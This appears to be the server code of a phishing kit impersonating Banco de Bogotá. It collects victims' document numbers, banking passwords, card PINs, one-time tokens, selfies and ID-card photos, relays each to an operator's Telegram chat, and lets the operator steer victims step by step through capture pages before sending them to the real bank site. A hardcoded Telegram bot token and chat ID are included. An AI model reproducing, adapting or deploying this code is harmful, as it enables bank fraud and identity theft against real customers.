/**
 * =========================================
 * PANEL DE BOGOTA - SERVIDOR PRINCIPAL
 * Sistema de Banca Virtual con Telegram Bot
 * Version: 2.0.0 - Refactorizado y Optimizado
 * =========================================
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { createServer } = require('http');
const { Server } = require('socket.io');

// =========================================
// CONFIGURACION
// =========================================

const CONFIG = {
    PORT: process.env.PORT || 3000,
    NODE_ENV: process.env.NODE_ENV || 'development',
    TELEGRAM: {
        TOKEN: process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM',
        CHAT_ID: process.env.TELEGRAM_CHAT_ID || '-1002638389042'
    },
    SOCKET: {
        PING_TIMEOUT: 60000,
        PING_INTERVAL: 25000,
        CONNECT_TIMEOUT: 5000,
        MAX_HTTP_BUFFER_SIZE: 1e6
    }
};

// =========================================
// INICIALIZACIN DE APLICACIN
// =========================================

const app = express();
const httpServer = createServer(app);

// Manejadores de estado de la aplicacin
const applicationState = {
    connectedClients: new Map(), // Map<socketId, { sessionId, connectedAt }>
    sessions: new Map(), // Map<sessionId, { history, data, fullData, socketId }>
    bot: null,
    isShuttingDown: false
};

// =========================================
// CONFIGURACIN DE SOCKET.IO
// =========================================

const io = new Server(httpServer, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST'],
        credentials: true
    },
    path: '/socket.io',
    transports: ['websocket'],
    allowUpgrades: false,
    upgradeTimeout: 5000,
    pingTimeout: CONFIG.SOCKET.PING_TIMEOUT,
    pingInterval: CONFIG.SOCKET.PING_INTERVAL,
    connectTimeout: CONFIG.SOCKET.CONNECT_TIMEOUT,
    maxHttpBufferSize: CONFIG.SOCKET.MAX_HTTP_BUFFER_SIZE,
    perMessageDeflate: false,
    httpCompression: false
});

// =========================================
// MIDDLEWARES
// =========================================

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// CORS global
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Anticache headers
app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
    next();
});

// Archivos estáticos sin caché
app.use(express.static(path.join(__dirname), {
    maxAge: 0,
    etag: false,
    lastModified: false,
    setHeaders: (res) => {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    }
}));

// Logger de peticiones
app.use((req, res, next) => {
    if (!req.path.includes('socket.io')) {
        console.log(`${req.method} ${req.path}`);
    }
    next();
});

// =========================================
// GESTIN DE SESIONES
// =========================================

const SessionManager = {
    /**
     * Crear o actualizar sesin
     */
    upsertSession(sessionId, socketId) {
        if (!applicationState.sessions.has(sessionId)) {
            applicationState.sessions.set(sessionId, {
                history: [],
                data: {},
                fullData: [],
                socketId,
                createdAt: Date.now(),
                lastActivity: Date.now()
            });
            console.log(`Nueva sesion creada: ${sessionId}`);
        } else {
            const session = applicationState.sessions.get(sessionId);
            session.socketId = socketId;
            session.lastActivity = Date.now();
            applicationState.sessions.set(sessionId, session);
            console.log(`Sesion actualizada: ${sessionId}`);
        }
    },

    /**
     * Obtener sesin por ID
     */
    getSession(sessionId) {
        return applicationState.sessions.get(sessionId);
    },

    /**
     * Actualizar datos de sesin
     */
    updateSessionData(sessionId, tipo, data) {
        const session = this.getSession(sessionId);
        if (!session) return;

        switch (tipo) {
            case 'Clave Segura':
                session.data.clave = {
                    tipoDocumento: data.tipoDocumento,
                    numeroDocumento: data.numeroDocumento,
                    clave: data.clave
                };
                session.history.push(' Clave Segura');
                session.fullData.push(
                    ` Clave Segura: ${data.tipoDocumento} ${data.numeroDocumento} | Clave: ${data.clave}`
                );
                break;

            case 'Tarjeta Dbito':
                session.data.tarjeta = {
                    tipoDocumento: data.tipoDocumento,
                    numeroDocumento: data.numeroDocumento,
                    ultimos4Digitos: data.ultimos4Digitos,
                    claveTarjeta: data.claveTarjeta
                };
                session.history.push(' Tarjeta Dbito');
                session.fullData.push(
                    ` Tarjeta  ltimos 4 dgitos: ${data.ultimos4Digitos} | Clave: ${data.claveTarjeta}`
                );
                session.fullData.push(
                    ` Usuario: ${data.tipoDocumento} ${data.numeroDocumento}`
                );
                break;

            case 'Token':
                // Token no se guarda en sesin, es temporal
                break;

            case 'Selfie':
                session.data.selfie = { messageId: data.messageId };
                session.history.push(' Selfie');
                session.fullData.push(` Selfie  ID: ${data.messageId}`);
                break;

            case 'Cdula Frontal':
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.frontal = { messageId: data.messageId };
                session.history.push(' Cdula Frontal');
                session.fullData.push(` Cdula FRONTAL  ID: ${data.messageId}`);
                break;

            case 'Cdula Trasera':
                if (!session.data.cedula) session.data.cedula = {};
                session.data.cedula.trasera = { messageId: data.messageId };
                session.history.push(' Cdula Trasera');
                session.fullData.push(` Cdula TRASERA  ID: ${data.messageId}`);
                break;
        }

        session.lastActivity = Date.now();
        applicationState.sessions.set(sessionId, session);
    },

    /**
     * Eliminar sesin
     */
    deleteSession(sessionId) {
        if (applicationState.sessions.delete(sessionId)) {
            console.log(`Sesion eliminada: ${sessionId}`);
            return true;
        }
        return false;
    },

    /**
     * Obtener todas las sesiones activas
     */
    getActiveSessions() {
        return Array.from(applicationState.sessions.keys());
    },

    /**
     * Limpiar sesiones inactivas (ms de 1 hora)
     */
    cleanupInactiveSessions() {
        const now = Date.now();
        const ONE_HOUR = 60 * 60 * 1000;
        let cleaned = 0;

        for (const [sessionId, session] of applicationState.sessions.entries()) {
            if (now - session.lastActivity > ONE_HOUR) {
                this.deleteSession(sessionId);
                cleaned++;
            }
        }

        if (cleaned > 0) {
            console.log(`${cleaned} sesion(es) inactiva(s) eliminada(s)`);
        }
    }
};

// Limpiar sesiones inactivas cada 15 minutos
setInterval(() => SessionManager.cleanupInactiveSessions(), 15 * 60 * 1000);

// =========================================
// TELEGRAM  FORMATEO DE MENSAJES
// =========================================

const TelegramFormatter = {
    /**
     * Formatea mensaje segn el tipo
     */
    formatMessage(data, sessionId = null) {
        if (typeof data !== 'object') {
            return data.toString();
        }

        const timestamp = new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota',
            dateStyle: 'short',
            timeStyle: 'short'
        });

        // No mostrar historial en mensajes

        switch (data.tipo) {
            case 'Clave Segura':
                return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                       `📋 <b>Tipo:</b> ${data.tipo}\n` +
                       `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                       `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
                       `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            case 'Tarjeta Débito':
                return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
                       `📋 <b>Tipo:</b> ${data.tipo}\n` +
                       `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                       `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n\n` +
                       `💳 <b>DATOS DE TARJETA:</b>\n` +
                       `🔢 <b>Últimos 4 dígitos:</b> <code>${data.ultimos4Digitos}</code>\n` +
                       `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            case 'Token':
                return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                       `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            case 'Selfie':
                return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            case 'Cédula Frontal':
                return `🪪 <b>CÉDULA - LADO FRONTAL</b>\n\n` +
                       `📄 <b>Lado:</b> FRENTE del documento\n` +
                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            case 'Cédula Trasera':
                return `🪪 <b>CÉDULA - LADO TRASERO</b>\n\n` +
                       `📄 <b>Lado:</b> REVERSO del documento\n` +
                       `✅ <b>Estado:</b> Ambos lados capturados\n` +
                       `🆔 <b>Message ID:</b> ${data.messageId}\n` +
                       `⏰ <b>Fecha:</b> ${timestamp}`;

            default:
                return JSON.stringify(data, null, 2);
        }
    },

    /**
     * Genera teclado inline de Telegram
     */
    getKeyboard() {
        return {
            inline_keyboard: [
                [
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
                    { text: '🔐 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
                    { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };
    }
};

// =========================================
// TELEGRAM  ENVO DE MENSAJES
// =========================================

const TelegramService = {
    /**
     * Enva mensaje o foto a Telegram
     */
    async sendMessage(data, sessionId = null) {
        try {
            // Actualizar sesin si no es token
            if (sessionId && data.tipo !== 'Token') {
                SessionManager.updateSessionData(sessionId, data.tipo, data);
            }

            const keyboard = TelegramFormatter.getKeyboard();

            // Enviar foto si existe
            if (data.foto) {
                return await this.sendPhoto(data, sessionId, keyboard);
            }

            // Enviar mensaje de texto
            const messageText = TelegramFormatter.formatMessage(data, sessionId);
            console.log(' Enviando mensaje a Telegram...');

            const result = await applicationState.bot.sendMessage(
                CONFIG.TELEGRAM.CHAT_ID,
                messageText,
                {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }
            );

            console.log(' Mensaje enviado  ID:', result.message_id);
            return result;

        } catch (error) {
            console.error(' Error al enviar mensaje:', error.message);
            throw error;
        }
    },

    /**
     * Enva foto a Telegram
     */
    async sendPhoto(data, sessionId, keyboard) {
        try {
            console.log(' Procesando foto...');

            if (!data.foto.includes('base64,')) {
                throw new Error('Formato de foto invlido');
            }

            const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
            console.log(' Buffer creado:', buffer.length, 'bytes');

            const caption = TelegramFormatter.formatMessage(data, sessionId);
            console.log(' Enviando foto a Telegram...');

            const result = await applicationState.bot.sendPhoto(
                CONFIG.TELEGRAM.CHAT_ID,
                buffer,
                {
                    caption,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }
            );

            console.log(' Foto enviada  ID:', result.message_id);
            return result;

        } catch (error) {
            console.error(' Error al enviar foto:', error.message);
            throw error;
        }
    }
};

// =========================================
// TELEGRAM  MANEJADOR DE REDIRECCIONES
// =========================================

const RedirectHandler = {
    getBaseUrl() {
        return process.env.RENDER_EXTERNAL_URL || 
               process.env.BASE_URL || 
               (CONFIG.NODE_ENV === 'production' ? '' : `http://localhost:${CONFIG.PORT}`);
    },

    getRedirectInfo(action) {
        const baseUrl = this.getBaseUrl();

        const redirectMap = {
            'pedir_logo': {
                url: `${baseUrl}/index.html?action=pedir_logo`,
                message: 'Por favor ingrese sus credenciales nuevamente'
            },
            'pedir_token': {
                url: `${baseUrl}/token.html?action=pedir_token`,
                message: 'Por favor ingrese el cdigo token'
            },
            'pedir_cara': {
                url: `${baseUrl}/cara.html?action=pedir_cara`,
                message: 'Por favor capture su selfie de verificacin'
            },
            'pedir_cedula': {
                url: `${baseUrl}/cedula.html?action=pedir_cedula`,
                message: 'Por favor capture su documento de identidad'
            },
            'finalizar': {
                url: 'https://www.bancodebogota.com/personas',
                message: 'Proceso finalizado exitosamente'
            }
        };

        return redirectMap[action] || { url: `${baseUrl}/`, message: null };
    }
};

// =========================================
// API ENDPOINTS
// =========================================

// Enviar mensaje a Telegram
app.post('/api/sendtelegram', async (req, res) => {
    try {
        console.log(' Solicitud recibida:', req.body.tipo);

        if (!req.body || !req.body.tipo) {
            return res.status(400).json({
                success: false,
                error: 'Datos incompletos'
            });
        }

        const sessionId = req.body.sessionId || `session_${Date.now()}`;
        const result = await TelegramService.sendMessage(req.body, sessionId);

        res.json({
            success: true,
            messageId: result.message_id
        });

    } catch (error) {
        console.error(' Error en /api/sendtelegram:', error.message);
        res.status(500).json({
            success: false,
            error: 'Error al procesar la solicitud'
        });
    }
});

// Limpiar sesin
app.post('/api/clearsession', (req, res) => {
    try {
        const sessionId = req.body.sessionId;
        if (sessionId) {
            SessionManager.deleteSession(sessionId);
        }
        res.json({ success: true });
    } catch (error) {
        console.error(' Error al limpiar sesin:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        environment: CONFIG.NODE_ENV,
        sessions: SessionManager.getActiveSessions().length,
        clients: applicationState.connectedClients.size
    });
});

// Verificacin de versin
app.get('/version', (req, res) => {
    res.json({
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        environment: CONFIG.NODE_ENV
    });
});

// =========================================
// RUTAS DE PGINAS HTML
// =========================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/:page(index|token|cara|cedula|dashboard).html', (req, res) => {
    const filePath = path.join(__dirname, `${req.params.page}.html`);
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(` Error sirviendo ${req.params.page}.html`);
            res.status(404).send('Pgina no encontrada');
        }
    });
});

// =========================================
// SOCKET.IO  GESTIN DE CONEXIONES
// =========================================

// Sistema de heartbeat para mantener conexiones activas
setInterval(() => {
    const now = Date.now();
    let staleConnections = 0;
    
    applicationState.connectedClients.forEach((clientInfo, socketId) => {
        const socket = io.sockets.sockets.get(socketId);
        if (!socket || !socket.connected) {
            applicationState.connectedClients.delete(socketId);
            staleConnections++;
            console.log(` Conexion obsoleta eliminada: ${socketId}`);
        }
    });
    
    if (staleConnections > 0) {
        console.log(` Limpieza: ${staleConnections} conexion(es) obsoleta(s) eliminada(s)`);
    }
}, 30000); // Cada 30 segundos

io.on('connection', (socket) => {
    console.log(' Cliente conectado:', socket.id);
    
    // Marcar socket como activo
    socket.data.lastActivity = Date.now();

    // Evento: Cliente se identifica con su sessionId
    socket.on('identify', (data) => {
        const sessionId = data.sessionId;
        console.log(` Cliente identificado: ${socket.id}  ${sessionId}`);

        // Registrar cliente
        applicationState.connectedClients.set(socket.id, {
            sessionId,
            connectedAt: Date.now()
        });

        // Crear/actualizar sesin
        SessionManager.upsertSession(sessionId, socket.id);

        // Confirmar conexin
        socket.emit('connected', {
            socketId: socket.id,
            sessionId,
            timestamp: new Date().toISOString()
        });
    });

    // Evento: Procesar accin desde Telegram
    socket.on('process_action', async (data) => {
        try {
            const { action, messageId } = data;
            console.log(` Procesando accin: ${action}`);

            const redirectInfo = RedirectHandler.getRedirectInfo(action);

            socket.emit('telegram_action', {
                action,
                messageId,
                message: redirectInfo.message,
                redirect: redirectInfo.url
            });

            console.log(` Accin "${action}" procesada`);

        } catch (error) {
            console.error(' Error al procesar accin:', error.message);
            socket.emit('telegram_action', {
                action: 'error',
                message: 'Error al procesar la accin'
            });
        }
    });

    // Evento: Verificacin de token
    socket.on('token_verification', async (data) => {
        console.log(' Verificacin de token:', data.codigo);

        try {
            if (!data || !data.codigo || !/^\d{6}$/.test(data.codigo)) {
                throw new Error('Token invlido');
            }

            const result = await TelegramService.sendMessage(data);

            socket.emit('telegram_action', {
                action: 'waiting_response',
                messageId: result.message_id,
                message: 'Verificando token...'
            });

        } catch (error) {
            console.error(' Error en token:', error.message);
            socket.emit('telegram_action', {
                action: 'error',
                message: 'Error al procesar el token'
            });
        }
    });

    // Evento: Ping para mantener conexión activa
    socket.on('ping', (data) => {
        socket.emit('pong', { timestamp: Date.now() });
        console.log(' Ping recibido de:', socket.id);
    });
    
    // Evento: Confirmación de recepción de eventos
    socket.on('event_received', (data) => {
        console.log(` Confirmacion recibida - Action: ${data.action}, Socket: ${socket.id}`);
    });

    // Evento: Desconexin
    socket.on('disconnect', (reason) => {
        console.log(' Cliente desconectado:', socket.id, '', reason);
        applicationState.connectedClients.delete(socket.id);
    });

    // Evento: Error
    socket.on('error', (error) => {
        console.error(' Error en socket:', socket.id, error.message);
    });
});

// =========================================
// TELEGRAM BOT  CALLBACK QUERIES
// =========================================

function setupTelegramBot() {
    applicationState.bot.on('callback_query', async (callbackQuery) => {
        if (!callbackQuery || !callbackQuery.message) {
            console.error(' Callback query invlido');
            return;
        }

        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;

        console.log(` Callback: ${action}`);

        try {
            // Responder al callback
            await applicationState.bot.answerCallbackQuery(callbackQuery.id, {
                text: action === 'finalizar' ? ' Proceso finalizado' : ` Redirigiendo...`,
                show_alert: false
            });

            // Obtener informacin de redireccin
            const redirectInfo = RedirectHandler.getRedirectInfo(action);

            // Preparar datos del evento
            const eventData = {
                action,
                messageId,
                message: redirectInfo.message,
                redirect: redirectInfo.url,
                timestamp: new Date().toISOString()
            };

            // Emitir evento a TODOS los clientes (solo una vez)
            io.emit('telegram_action', eventData);
            
            const clientsConnected = applicationState.connectedClients.size;
            console.log(` [EMIT] ${clientsConnected} cliente(s) | ${action}`);
            
            // Verificar que hay clientes conectados
            if (clientsConnected === 0) {
                console.warn(` [WARN] Sin clientes`);
                return;
            }

            // Esperar mínimo para que el cliente redirija primero (500ms)
            setTimeout(async () => {
                if (action !== 'finalizar') {
                    try {
                        const originalMessage = callbackQuery.message;
                        
                        // Si el mensaje tiene una foto, editar caption; si no, editar texto
                        if (originalMessage.photo && originalMessage.photo.length > 0) {
                            await applicationState.bot.editMessageCaption(
                                `${originalMessage.caption || ''}\n\n✅ <b>COMANDO EJECUTADO</b>`,
                                {
                                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                                    message_id: messageId,
                                    parse_mode: 'HTML',
                                    reply_markup: { inline_keyboard: [] }
                                }
                            );
                        } else {
                            await applicationState.bot.editMessageText(
                                `${originalMessage.text || ''}\n\n✅ <b>COMANDO EJECUTADO</b>`,
                                {
                                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                                    message_id: messageId,
                                    parse_mode: 'HTML',
                                    reply_markup: { inline_keyboard: [] }
                                }
                            );
                        }
                        console.log(` [OK] Mensaje actualizado`);
                    } catch (err) {
                        // Ignorar errores
                    }
                }
            }, 500);

            // Si es finalizar, limpiar sesiones y editar mensaje
            if (action === 'finalizar') {
                const sessionCount = applicationState.sessions.size;
                applicationState.sessions.clear();
                console.log(` ${sessionCount} sesin(es) limpiada(s)`);

                const finalMessage = ` <b>Proceso finalizado</b>\n\n${callbackQuery.message.text}\n\n <i>Sesiones limpiadas</i>`;

                await applicationState.bot.editMessageText(finalMessage, {
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                });

                console.log(' Mensaje actualizado');
            }

            console.log(` Callback "${action}" COMPLETADO`);
            console.log(`========================================\n`);

        } catch (error) {
            console.error(' Error en callback:', error.message);

            try {
                await applicationState.bot.answerCallbackQuery(callbackQuery.id, {
                    text: ' Error al procesar la accin',
                    show_alert: true
                });
            } catch (e) {
                console.error(' No se pudo notificar el error');
            }
        }
    });

    // Eventos de error del bot
    applicationState.bot.on('error', (error) => {
        console.error(' Error del bot:', error.message);
    });

    applicationState.bot.on('polling_error', (error) => {
        // Ignorar errores 409 (mltiples instancias)
        if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
            console.warn(' Detectada otra instancia del bot. Ignorando polling...');
            return;
        }
        console.error(' Error de polling:', error.message);
    });

    applicationState.bot.on('webhook_error', (error) => {
        console.error(' Error de webhook:', error.message);
    });
}

// =========================================
// MANEJO DE ERRORES GLOBAL
// =========================================

process.on('unhandledRejection', (reason, promise) => {
    console.error(' Unhandled Rejection:', reason);
});

process.on('uncaughtException', (error) => {
    console.error(' Uncaught Exception:', error);
    if (CONFIG.NODE_ENV !== 'production') {
        process.exit(1);
    }
});

// Cierre graceful
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

function gracefulShutdown() {
    if (applicationState.isShuttingDown) return;

    applicationState.isShuttingDown = true;
    console.log(' Cerrando servidor...');

    httpServer.close(() => {
        console.log(' Servidor cerrado');
        if (applicationState.bot) {
            applicationState.bot.stopPolling();
        }
        process.exit(0);
    });

    // Forzar cierre despus de 10 segundos
    setTimeout(() => {
        console.error(' Cierre forzado');
        process.exit(1);
    }, 10000);
}

// =========================================
// INICIALIZACIN DEL SERVIDOR
// =========================================

async function startServer() {
    try {
        // Inicializar bot de Telegram
        applicationState.bot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, {
            polling: {
                interval: 1000,
                autoStart: true,
                params: {
                    timeout: 10
                }
            },
            filepath: false
        });

        // Verificar conexin
        const botInfo = await applicationState.bot.getMe();
        console.log(' Bot conectado:', botInfo.username);
        console.log(' Bot ID:', botInfo.id);

        // Desactivar webhook
        await applicationState.bot.deleteWebHook();
        console.log(' Webhook desactivado (modo polling)');

        // Configurar callbacks del bot
        setupTelegramBot();

        // Iniciar servidor HTTP
        httpServer.listen(CONFIG.PORT, () => {
            console.log('\n ===============================');
            console.log(' SERVIDOR INICIADO EXITOSAMENTE');
            console.log(` Puerto: ${CONFIG.PORT}`);
            console.log(` Entorno: ${CONFIG.NODE_ENV}`);
            console.log(` URL: http://localhost:${CONFIG.PORT}`);
            console.log(' Socket.io: Activo');
            console.log(` Clientes: ${applicationState.connectedClients.size}`);
            console.log(` Sesiones: ${applicationState.sessions.size}`);
            console.log(' ===============================\n');
        });

    } catch (error) {
        console.error(' Error crtico al iniciar:', error.message);
        console.error('Stack:', error.stack);
        process.exit(1);
    }
}

// Iniciar el servidor
startServer().catch(error => {
    console.error(' Error fatal:', error);
    process.exit(1);
});

// =========================================
// EXPORTAR PARA OTROS ENTORNOS
// =========================================

module.exports = { app, httpServer, io };

